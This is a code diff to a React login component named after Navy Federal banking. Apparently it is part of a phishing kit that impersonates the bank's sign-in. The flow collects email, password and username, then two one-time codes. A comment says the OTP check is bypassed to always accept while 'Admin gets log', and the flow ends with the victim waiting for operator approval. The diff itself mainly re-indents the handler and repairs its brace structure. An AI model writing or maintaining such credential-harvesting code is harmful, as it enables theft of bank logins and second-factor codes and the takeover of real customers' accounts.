@@ -55,75 +55,76 @@ export default function NavyFederalBanking() {
   }, [step, attemptId])
 
   async function onSubmit(e: React.FormEvent) {
-    e.preventDefault()
-    setError(null)
-    setLoading(true)
-    try {
-      if (step === 'credentials') {
-        const r = await startChallenge({ email, password })
-        setLoading(false)
-        if (!r.ok) {
-          setError(r.error)
-          return
-        }
-        setAttemptId(r.attemptId)
-        setStep('username')
-        setNote(null)
-        return
-      }
-      if (step === 'username') {
-        // ✅ Validate confirm password matches
-        if (password !== confirmPassword) {
-          setLoading(false)
-          setError('Passwords do not match!')
-          return
-        }
-
-        if (!attemptId) {
-          setLoading(false)
-          setError('Session lost.')
-          return
-        }
-        const r = await submitUsername({ attemptId, username })
-        setLoading(false)
-        if (!r.ok) {
-          setError(r.error)
-          return
-        }
-        setOtp('')
-        setStep('otp1')
-        setNote('Code sent to your email.')
-        return
-      }
-      if (step === 'otp1' || step === 'otp2') {
-        if (!attemptId) {
-          setLoading(false)
-          setError('Session lost.')
-          return
-        }
-        
-        const which = step === 'otp1' ? 1 : 2
-        
-         // ✅ BYPASS OTP — ALWAYS ACCEPT (Admin gets log)
-  const result = await submitOtp({ attemptId, otp, which })
-  console.log('📱 OTP result:', result) // Optional: log result for debugging
-  
-  setLoading(false)
-  setOtp('')
-  
-  if (which === 1) {
-    setStep('otp2')
-    setNote('Second code sent to your email.')
-  } else {
-    setStep('awaiting_approval')
-    setNote(WAIT_MSG)
-  }
-  return
-    } catch (err) {
+  e.preventDefault()
+  setError(null)
+  setLoading(true)
+  try {
+    if (step === 'credentials') {
+      const r = await startChallenge({ email, password })
       setLoading(false)
-      setError(err instanceof Error ? err.message : 'Error')
+      if (!r.ok) {
+        setError(r.error)
+        return
+      }
+      setAttemptId(r.attemptId)
+      setStep('username')
+      setNote(null)
+      return
     }
+    if (step === 'username') {
+      // ✅ Validate confirm password matches
+      if (password !== confirmPassword) {
+        setLoading(false)
+        setError('Passwords do not match!')
+        return
+      }
+
+      if (!attemptId) {
+        setLoading(false)
+        setError('Session lost.')
+        return
+      }
+      const r = await submitUsername({ attemptId, username })
+      setLoading(false)
+      if (!r.ok) {
+        setError(r.error)
+        return
+      }
+      setOtp('')
+      setStep('otp1')
+      setNote('Code sent to your email.')
+      return
+    }
+    if (step === 'otp1' || step === 'otp2') {
+      if (!attemptId) {
+        setLoading(false)
+        setError('Session lost.')
+        return
+      }
+      
+      const which = step === 'otp1' ? 1 : 2
+      
+      // ✅ BYPASS OTP — ALWAYS ACCEPT (Admin gets log)
+      const result = await submitOtp({ attemptId, otp, which })
+      console.log('📱 OTP result:', result)
+      
+      setLoading(false)
+      setOtp('')
+      
+      if (which === 1) {
+        setStep('otp2')
+        setNote('Second code sent to your email.')
+      } else {
+        setStep('awaiting_approval')
+        setNote(WAIT_MSG)
+      }
+      return
+    }
+  } catch (err) {
+    setLoading(false)
+    setError(err instanceof Error ? err.message : 'Error')
   }
+}
 
   const titles: Record<Exclude<Step, 'approved_success'>, string> = {
     credentials: 'Sign In',
